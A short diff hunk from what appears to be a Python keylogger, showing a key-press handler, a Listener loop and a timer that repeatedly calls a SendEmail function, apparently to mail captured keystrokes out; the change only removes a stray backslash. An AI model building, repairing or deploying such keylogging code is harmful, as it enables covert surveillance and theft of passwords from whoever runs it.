@@ -91,7 +91,7 @@ def on_press(key):
 
 setInterval(SendEmail, {SleepTime})
 
-with Listener(on_press=on_press) as listener:\
+with Listener(on_press=on_press) as listener:
     setInterval(SendEmail, 30)
     listener.join()
 
